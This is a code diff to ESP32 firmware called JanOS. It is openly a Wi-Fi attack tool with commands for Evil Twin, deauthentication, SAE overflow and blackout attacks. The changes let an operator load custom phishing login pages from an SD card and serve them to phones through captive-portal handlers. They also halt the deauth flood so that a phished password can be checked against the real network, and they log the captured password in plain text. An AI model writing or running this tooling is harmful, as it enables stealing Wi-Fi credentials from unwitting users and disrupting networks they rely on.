@@ -1,6 +1,7 @@
 // main.c
 #include <stdio.h>
 #include <string.h>
+#include <strings.h>
 #include <stdlib.h>
 #include <inttypes.h>
 #include <errno.h>
@@ -30,6 +31,7 @@
 #include "driver/spi_master.h"
 #include "esp_vfs_fat.h"
 #include "sdmmc_cmd.h"
+#include <dirent.h>
 
 #include "driver/gpio.h"
 
@@ -51,7 +53,7 @@
 #include "lwip/dhcp.h"
 
 //Version number
-#define JANOS_VERSION "0.0.4"
+#define JANOS_VERSION "0.1.0"
 
 #define NEOPIXEL_GPIO      27
 #define LED_COUNT          1
@@ -248,6 +250,14 @@ char * evilTwinPassword = NULL;
 int connectAttemptCount = 0;
 led_strip_handle_t strip;
 
+// SD card HTML file management
+#define MAX_HTML_FILES 50
+#define MAX_HTML_FILENAME 64
+static char sd_html_files[MAX_HTML_FILES][MAX_HTML_FILENAME];
+static int sd_html_count = 0;
+static char* custom_portal_html = NULL;
+static bool sd_card_mounted = false;
+
 
 // Methods forward declarations
 static int cmd_scan_networks(int argc, char **argv);
@@ -261,6 +271,8 @@ static int cmd_show_probes(int argc, char **argv);
 static int cmd_sniffer_debug(int argc, char **argv);
 static int cmd_start_blackout(int argc, char **argv);
 static int cmd_start_portal(int argc, char **argv);
+static int cmd_list_sd(int argc, char **argv);
+static int cmd_select_html(int argc, char **argv);
 static int cmd_stop(int argc, char **argv);
 static int cmd_reboot(int argc, char **argv);
 static esp_err_t start_background_scan(void);
@@ -376,7 +388,7 @@ static void wifi_event_handler(void *event_handler_arg,
                                int32_t event_id,
                                void *event_data) {
     if (event_base == WIFI_EVENT) {
-        MY_LOG_INFO(TAG, "WiFi event: %ld", event_id);
+        //MY_LOG_INFO(TAG, "WiFi event: %ld", event_id);
         switch (event_id) {
         case WIFI_EVENT_STA_CONNECTED: {
             const wifi_event_sta_connected_t *e = (const wifi_event_sta_connected_t *)event_data;
@@ -384,6 +396,64 @@ static void wifi_event_handler(void *event_handler_arg,
                      (const char*)e->ssid, e->channel,
                      e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
             MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
+            
+            // If portal is active (Evil Twin attack), shut it down after successful connection
+            if (portal_active) {
+                MY_LOG_INFO(TAG, "Password verified! Shutting down Evil Twin portal...");
+                portal_active = false;
+                
+                // Stop DNS server task
+                if (dns_server_task_handle != NULL) {
+                    MY_LOG_INFO(TAG, "Stopping DNS server task...");
+                    
+                    // Wait for DNS task to finish (it checks portal_active flag)
+                    for (int i = 0; i < 30 && dns_server_task_handle != NULL; i++) {
+                        vTaskDelay(pdMS_TO_TICKS(100));
+                    }
+                    
+                    // Force cleanup if still running
+                    if (dns_server_task_handle != NULL) {
+                        vTaskDelete(dns_server_task_handle);
+                        dns_server_task_handle = NULL;
+                        if (dns_server_socket >= 0) {
+                            close(dns_server_socket);
+                            dns_server_socket = -1;
+                        }
+                        MY_LOG_INFO(TAG, "DNS server task forcefully stopped.");
+                    } else {
+                        MY_LOG_INFO(TAG, "DNS server task stopped.");
+                    }
+                }
+                
+                // Stop HTTP server
+                if (portal_server != NULL) {
+                    httpd_stop(portal_server);
+                    portal_server = NULL;
+                    MY_LOG_INFO(TAG, "HTTP server stopped.");
+                }
+                
+                // Stop DHCP server
+                esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+                if (ap_netif) {
+                    esp_err_t dhcp_ret = esp_netif_dhcps_stop(ap_netif);
+                    if (dhcp_ret != ESP_OK) {
+                        MY_LOG_INFO(TAG, "Failed to stop DHCP server: %s", esp_err_to_name(dhcp_ret));
+                    } else {
+                        MY_LOG_INFO(TAG, "DHCP server stopped.");
+                    }
+                }
+                
+                // Change WiFi mode from APSTA to STA only (disable AP)
+                esp_err_t mode_ret = esp_wifi_set_mode(WIFI_MODE_STA);
+                if (mode_ret == ESP_OK) {
+                    MY_LOG_INFO(TAG, "WiFi mode changed to STA only - AP disabled.");
+                } else {
+                    MY_LOG_INFO(TAG, "Failed to change WiFi mode: %s", esp_err_to_name(mode_ret));
+                }
+                
+                MY_LOG_INFO(TAG, "Evil Twin portal shut down successfully!");
+            }
+            
             applicationState = IDLE;
             break;
         }
@@ -579,6 +649,33 @@ static void verify_password(const char* password) {
 
     MY_LOG_INFO(TAG, "Password received: %s", password);
 
+    // Stop deauth attack BEFORE attempting to connect
+    // This is crucial because deauth task switches channels which prevents stable STA connection
+    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping deauth attack to attempt connection...");
+        deauth_attack_active = false;
+        
+        // Wait a bit for task to finish
+        for (int i = 0; i < 20 && deauth_attack_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (deauth_attack_task_handle != NULL) {
+            vTaskDelete(deauth_attack_task_handle);
+            deauth_attack_task_handle = NULL;
+            MY_LOG_INFO(TAG, "Deauth attack task forcefully stopped.");
+        }
+        
+        // Clear LED
+        esp_err_t led_err = led_strip_clear(strip);
+        if (led_err == ESP_OK) {
+            led_strip_refresh(strip);
+        }
+        
+        MY_LOG_INFO(TAG, "Deauth attack stopped.");
+    }
+
     //Now, let's check if it's a password for Evil Twin:
     applicationState = EVIL_TWIN_PASS_CHECK;
 
@@ -589,7 +686,7 @@ static void verify_password(const char* password) {
     strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password));
     sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
     esp_wifi_set_config(WIFI_IF_STA, &sta_config);
-    vTaskDelay(pdMS_TO_TICKS(2000));
+    vTaskDelay(pdMS_TO_TICKS(500));
     MY_LOG_INFO(TAG, "Attempting to connect to SSID='%s' with password='%s'", evilTwinSSID, password);
     connectAttemptCount = 0;
     MY_LOG_INFO(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
@@ -1967,6 +2064,148 @@ static int cmd_reboot(int argc, char **argv)
     return 0;
 }
 
+// Command: list_sd - Lists HTML files on SD card
+static int cmd_list_sd(int argc, char **argv)
+{
+    (void)argc; (void)argv;
+    
+    // Initialize SD card if not already mounted
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
+        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
+        return 1;
+    }
+    
+    DIR *dir = opendir("/sdcard");
+    if (dir == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open /sdcard directory. Error: %d (%s)", errno, strerror(errno));
+        return 1;
+    }
+    
+    sd_html_count = 0;
+    struct dirent *entry;
+    
+    while ((entry = readdir(dir)) != NULL && sd_html_count < MAX_HTML_FILES) {
+        // Skip directories and special entries
+        if (entry->d_type == DT_DIR) {
+            continue;
+        }
+        
+        // Skip macOS metadata files (._filename or _filename in MS-DOS 8.3)
+        if (entry->d_name[0] == '.' || entry->d_name[0] == '_') {
+            continue;
+        }
+        
+        // Check if file ends with .html or .htm (case insensitive)
+        size_t len = strlen(entry->d_name);
+        bool is_html = false;
+        
+        if (len > 5) {
+            const char *ext = entry->d_name + len - 5;
+            if (strcasecmp(ext, ".html") == 0) {
+                is_html = true;
+            }
+        }
+        
+        if (!is_html && len > 4) {
+            const char *ext = entry->d_name + len - 4;
+            if (strcasecmp(ext, ".htm") == 0) {
+                is_html = true;
+            }
+        }
+        
+        if (is_html) {
+            strncpy(sd_html_files[sd_html_count], entry->d_name, MAX_HTML_FILENAME - 1);
+            sd_html_files[sd_html_count][MAX_HTML_FILENAME - 1] = '\0';
+            sd_html_count++;
+        }
+    }
+    
+    closedir(dir);
+    
+    if (sd_html_count == 0) {
+        MY_LOG_INFO(TAG, "No HTML files found on SD card.");
+        return 0;
+    }
+    
+    MY_LOG_INFO(TAG, "HTML files found on SD card:");
+    for (int i = 0; i < sd_html_count; i++) {
+        printf("%d %s\n", i + 1, sd_html_files[i]);
+    }
+    
+    return 0;
+}
+
+// Command: select_html [index] - Loads HTML file from SD card
+static int cmd_select_html(int argc, char **argv)
+{
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: select_html <index>");
+        MY_LOG_INFO(TAG, "Run list_sd first to see available HTML files.");
+        return 1;
+    }
+    
+    int index = atoi(argv[1]) - 1; // Convert from 1-based to 0-based
+    
+    if (index < 0 || index >= sd_html_count) {
+        MY_LOG_INFO(TAG, "Invalid index. Run list_sd to see available files.");
+        return 1;
+    }
+    
+    // Initialize SD card if not already mounted
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
+        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
+        return 1;
+    }
+    
+    char filepath[128];
+    snprintf(filepath, sizeof(filepath), "/sdcard/%s", sd_html_files[index]);
+    
+    // Open file and get size
+    FILE *f = fopen(filepath, "r");
+    if (f == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open file: %s", filepath);
+        return 1;
+    }
+    
+    // Get file size
+    fseek(f, 0, SEEK_END);
+    long fsize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    
+    if (fsize <= 0 || fsize > 100000) { // Limit to 100KB
+        MY_LOG_INFO(TAG, "File size invalid or too large: %ld bytes", fsize);
+        fclose(f);
+        return 1;
+    }
+    
+    // Free previous custom HTML if exists
+    if (custom_portal_html != NULL) {
+        free(custom_portal_html);
+        custom_portal_html = NULL;
+    }
+    
+    // Allocate memory and read file
+    custom_portal_html = (char*)malloc(fsize + 1);
+    if (custom_portal_html == NULL) {
+        MY_LOG_INFO(TAG, "Failed to allocate memory for HTML file.");
+        fclose(f);
+        return 1;
+    }
+    
+    size_t bytes_read = fread(custom_portal_html, 1, fsize, f);
+    custom_portal_html[bytes_read] = '\0';
+    fclose(f);
+    
+    MY_LOG_INFO(TAG, "Loaded HTML file: %s (%u bytes)", sd_html_files[index], (unsigned int)bytes_read);
+    MY_LOG_INFO(TAG, "Portal will now use this custom HTML.");
+    
+    return 0;
+}
+
 // Wardrive task function (runs in background)
 static void wardrive_task(void *pvParameters) {
     (void)pvParameters;
@@ -2225,8 +2464,8 @@ static int cmd_start_wardrive(int argc, char **argv) {
     return 0;
 }
 
-// HTML form for password input
-static const char* portal_html = 
+// HTML form for password input (default)
+static const char* default_portal_html = 
 "<!DOCTYPE html>"
 "<html>"
 "<head>"
@@ -2253,8 +2492,8 @@ static const char* portal_html =
 "<div class='container'>"
 "<h1>Portal Access</h1>"
 "<form method='POST' action='/login'>"
-"<input type='password' name='password' placeholder='Podaj hasło' required>"
-"<button type='submit'>Zaloguj</button>"
+"<input type='password' name='password' placeholder='Enter password' required>"
+"<button type='submit'>Log in</button>"
 "</form>"
 "</div>"
 "</body>"
@@ -2326,6 +2565,7 @@ static esp_err_t portal_handler(httpd_req_t *req) {
     MY_LOG_INFO(TAG, "Portal page accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
     MY_LOG_INFO(TAG, "Portal handler called - serving portal page!");
     httpd_resp_set_type(req, "text/html");
+    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
     httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
 }
@@ -2361,6 +2601,7 @@ static esp_err_t root_handler(httpd_req_t *req) {
     
     // Always return the portal HTML with password form
     httpd_resp_set_type(req, "text/html");
+    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
     httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
 }
@@ -2381,6 +2622,7 @@ static esp_err_t android_captive_handler(httpd_req_t *req) {
     httpd_resp_set_hdr(req, "Content-Type", "text/html");
     
     // Send our portal HTML to trigger captive portal
+    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
     httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
 }
@@ -2399,6 +2641,7 @@ static esp_err_t ios_captive_handler(httpd_req_t *req) {
     httpd_resp_set_hdr(req, "Content-Type", "text/html");
     
     // Send our portal HTML to show password form
+    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
     httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
 }
@@ -2415,6 +2658,7 @@ static esp_err_t captive_detection_handler(httpd_req_t *req) {
     
     // Always return the portal HTML with password form
     httpd_resp_set_type(req, "text/html");
+    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
     httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
     return ESP_OK;
 }
@@ -2971,6 +3215,24 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&reboot_cmd));
+
+    const esp_console_cmd_t list_sd_cmd = {
+        .command = "list_sd",
+        .help = "Lists HTML files on SD card",
+        .hint = NULL,
+        .func = &cmd_list_sd,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&list_sd_cmd));
+
+    const esp_console_cmd_t select_html_cmd = {
+        .command = "select_html",
+        .help = "Load custom HTML from SD card: select_html <index>",
+        .hint = NULL,
+        .func = &cmd_select_html,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&select_html_cmd));
 }
 
 void app_main(void) {
@@ -3035,8 +3297,11 @@ void app_main(void) {
     MY_LOG_INFO(TAG,"  start_evil_twin");
     MY_LOG_INFO(TAG,"  start_deauth");
     MY_LOG_INFO(TAG,"  sae_overflow");
+    MY_LOG_INFO(TAG,"  start_blackout");
     MY_LOG_INFO(TAG,"  start_wardrive");
     MY_LOG_INFO(TAG,"  start_portal");
+    MY_LOG_INFO(TAG,"  list_sd");
+    MY_LOG_INFO(TAG,"  select_html <index>");
     MY_LOG_INFO(TAG,"  start_sniffer");
     MY_LOG_INFO(TAG,"  show_sniffer_results");
     MY_LOG_INFO(TAG,"  show_probes");
@@ -3055,7 +3320,7 @@ void app_main(void) {
  
     ESP_ERROR_CHECK(esp_console_start_repl(repl));
     vTaskDelay(pdMS_TO_TICKS(500));
-    MY_LOG_INFO(TAG,"BOARD READY v6");
+    MY_LOG_INFO(TAG,"BOARD READY");
     vTaskDelay(pdMS_TO_TICKS(100));
 }
 
@@ -3991,6 +4256,11 @@ static esp_err_t init_gps_uart(void) {
 static esp_err_t init_sd_card(void) {
     esp_err_t ret;
     
+    // Check if SD card is already mounted
+    if (sd_card_mounted) {
+        return ESP_OK;
+    }
+    
     // Options for mounting the filesystem (optimized for low memory)
     esp_vfs_fat_sdmmc_mount_config_t mount_config = {
         .format_if_mount_failed = false,  // Don't format automatically to save memory
@@ -4013,7 +4283,7 @@ static esp_err_t init_sd_card(void) {
     };
     
     ret = spi_bus_initialize(SPI2_HOST, &bus_cfg, SPI_DMA_CH_AUTO);  // DMA required for SD card
-    if (ret != ESP_OK) {
+    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
         MY_LOG_INFO(TAG, "Failed to initialize SPI bus: %s", esp_err_to_name(ret));
         return ret;
     }
@@ -4052,6 +4322,9 @@ static esp_err_t init_sd_card(void) {
     } else {
         MY_LOG_INFO(TAG, "SD card write test failed, errno: %d (%s)", errno, strerror(errno));
     }
+    
+    // Mark SD card as successfully mounted
+    sd_card_mounted = true;
     
     return ESP_OK;
 }
